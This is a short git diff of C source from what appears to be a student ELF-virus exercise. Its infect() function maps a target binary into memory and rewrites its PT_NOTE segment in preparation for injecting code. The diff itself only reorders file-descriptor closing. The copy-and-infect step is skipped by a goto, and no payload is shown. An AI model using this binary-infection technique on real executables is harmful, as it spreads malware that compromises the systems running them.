@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/06 11:25:42 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/06 12:47:27 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -43,13 +43,13 @@ bool	infect(profiling *this, const str path) {
 		goto infect_end;
 
 	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	close(fd);
 	if (file_origin == MAP_FAILED) {
 		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
 		return true;
 	}
 
 	data.mmap_size = file_stat.st_size;
+	data.fd = fd;
 
 	// Logic starts
 	if (parsing(file_origin, file_stat, &data) == false) {
@@ -59,6 +59,8 @@ bool	infect(profiling *this, const str path) {
 
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
+
+
 
 	goto infect_end;
 	//	Copy the code
@@ -82,6 +84,7 @@ bool	infect(profiling *this, const str path) {
 	// Logic ends
 	infect_end:
 	munmap(ret, file_origin, file_stat.st_size);
+	close(fd);
 
 	return false;
 }
